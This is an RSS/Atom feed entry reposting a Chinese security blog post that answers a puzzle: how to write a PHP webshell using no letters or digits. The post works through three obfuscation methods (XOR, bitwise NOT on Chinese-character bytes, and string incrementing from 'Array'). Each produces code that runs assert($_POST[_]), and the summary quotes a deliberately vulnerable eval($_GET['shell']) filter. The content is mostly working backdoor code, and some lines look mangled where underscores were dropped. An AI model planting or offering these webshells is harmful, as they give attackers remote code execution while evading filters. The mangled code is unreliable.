class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;%13&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;).(&apos;%13&apos;^&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;%05&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;).(&apos;%12&apos;^&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;%14&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;); // $=&apos;assert&apos;;</span><br><span class="line">$=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $=&apos;POST&apos;;</span><br><span class="line">$__=$$;</span><br><span class="line">$($[_]); // assert($POST[]);</span><br></pre></td></tr></table></figure></p><p>执行结果如下：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/b2ac8554-37f8-448e-bc79-b7213eb2cfb8.jpg" target="_blank" rel="noopener"><img src="https://www.leavesongs.com/media/attachment/2017/02/17/b2ac8554-37f8-448e-bc79-b7213eb2cfb8.6713f3c45766.jpg" alt="14871921588272.jpg"></a></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a><a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html#_3" target="_blank" rel="noopener">方法二</a></h3><p>和方法一有异曲同工之妙，唯一差异就是，方法一使用的是位运算里的“异或”，方法二使用的是位运算里的“取反”。</p><p>方法二利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;{2}</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code>：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/fadccb70-4143-49df-aa47-bc9a1af93c56.jpg" target="_blank" rel="noopener"><img src="https://www.leavesongs.com/media/attachment/2017/02/17/fadccb70-4143-49df-aa47-bc9a1af93c56.97e405012da5.jpg" alt="14872686600768.jpg"></a></p><p>利用这个特性，我找了一篇文章（ <a href="https://www.leavesongs.com/THINK/answer.html" target="_blank" rel="noopener">https://www.leavesongs.com/THINK/answer.html</a> ），自动选择了其中一些汉字，生成如下答案：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);</span><br><span class="line">$_=$/$__;</span><br><span class="line"></span><br><span class="line">$_=&apos;&apos;;</span><br><span class="line">$=&quot;瞰&quot;;$_.=~($&#123;$&#125;);$__=&quot;和&quot;;$_.=~($&#123;$&#125;);$_=&quot;和&quot;;$_.=~($&#123;$&#125;);$_=&quot;的&quot;;$_.=~($&#123;$&#125;);$__=&quot;半&quot;;$_.=~($&#123;$&#125;);$__=&quot;始&quot;;$_.=~($&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_=&apos;&apos;;$__=&quot;俯&quot;;$_.=~($_&#123;$&#125;);$=&quot;瞰&quot;;$__.=~($_&#123;$&#125;);$=&quot;次&quot;;$__.=~($&#123;$&#125;);$_=&quot;站&quot;;$_.=~($__&#123;$&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$=$$__;</span><br><span class="line">$_($[$]);</span><br></pre></td></tr></table></figure></p><p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/82b376a7-08a8-4e20-9686-553f400d280d.jpg" target="_blank" rel="noopener"><img src="https://www.leavesongs.com/media/attachment/2017/02/17/82b376a7-08a8-4e20-9686-553f400d280d.d8b4b6b1530c.jpg" alt="14871906748025.jpg"></a></p><p>这个答案还利用了PHP的弱类型特性。因为要获取<code>&#39;和&#39;{2}</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>。</p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a><a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html#_4" target="_blank" rel="noopener">方法三</a></h3><p>那么，如果不用位运算这个套路，能不能搞定这题呢？有何不可。</p><p>这就得借助PHP的一个小技巧，先看文档： <a href="http://php.net/manual/zh/language.operators.increment.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.operators.increment.php</a></p><p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/a386505b-1c14-48f0-88cb-66923770df33.jpg" target="_blank" rel="noopener"><img src="https://www.leavesongs.com/media/attachment/2017/02/17/a386505b-1c14-48f0-88cb-66923770df33.8732f996cd67.jpg" alt="14872693882387.jpg"></a></p><p>也就是说，<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p><p>那么，如何拿到一个值为字符串’a’的变量呢？</p><p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.jpg" target="_blank" rel="noopener"><img src="https://www.leavesongs.com/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.72f524026162.jpg" alt="14872697183159.jpg"></a></p><p>再取这个字符串的第一个字母，就可以获得’A’了。</p><p>利用这个技巧，我编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是<code>ASSERT($_POST[_])</code>，无需获取小写a）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$=[];</span><br><span class="line">$=@&quot;$&quot;; // $=&apos;Array&apos;;</span><br><span class="line">$=$[&apos;!&apos;==&apos;@&apos;]; // $=$[0];</span><br><span class="line">$=$; // A</span><br><span class="line">$=$;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;</span><br><span class="line">$__.=$; // S</span><br><span class="line">$_.=$; // S</span><br><span class="line">$=$;</span><br><span class="line">$++;$++;$++;$++; // E </span><br><span class="line">$__.=$;</span><br><span class="line">$=$;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; // R</span><br><span class="line">$.=$;</span><br><span class="line">$=$;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; // T</span><br><span class="line">$.=$__;</span><br><span class="line"></span><br><span class="line">$_=&apos;&apos;;</span><br><span class="line">$=$;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; // P</span><br><span class="line">$__.=$;</span><br><span class="line">$=$;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; // O</span><br><span class="line">$__.=$;</span><br><span class="line">$=$_;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; // S</span><br><span class="line">$__.=$;</span><br><span class="line">$=$_;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; // T</span><br><span class="line">$__.=$__;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$=$$__;</span><br><span class="line">$($[]); // ASSERT($POST[]);</span><br></pre></td></tr></table></figure></p><p>执行结果：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/d92e3d40-a451-4fc4-a516-e0747b721c69.jpg" target="_blank" rel="noopener"><img src="https://www.leavesongs.com/media/attachment/2017/02/17/d92e3d40-a451-4fc4-a516-e0747b721c69.2b122097850e.jpg" alt="14872701052595.jpg"></a><br>原文链接：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;作者：离别歌&quot;&gt;&lt;a href=&quot;#作者：离别歌&quot; class=&quot;headerlink&quot; title=&quot;作者：离别歌&quot;&gt;&lt;/a&gt;作者：离别歌&lt;/h4&gt;&lt;h2 id=&quot;正文：&quot;&gt;&lt;a href=&quot;#正文：&quot; class=&quot;headerlink&quot; title=&quot;正文：&quot;&gt;&lt;/a&gt;正文：&lt;/h2&gt;&lt;p&gt;在小密圈提了个问题，“如何编写一个不使用数字和字母的webshell”，并具体成如下代码：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;if(!preg_match(&amp;apos;/[a-z0-9]/is&amp;apos;,$_GET[&amp;apos;shell&amp;apos;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  eval($_GET[&amp;apos;shell&amp;apos;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;那么，这个代码如何利用？&lt;br&gt;
    
    </summary>
    
      <category term="技术文章" scheme="http://www.0x002.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="奇淫技巧" scheme="http://www.0x002.com/tags/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/"/>
    
      <category term="webshell" scheme="http://www.0x002.com/tags/webshell/"/>
    
  </entry>
  
</feed>
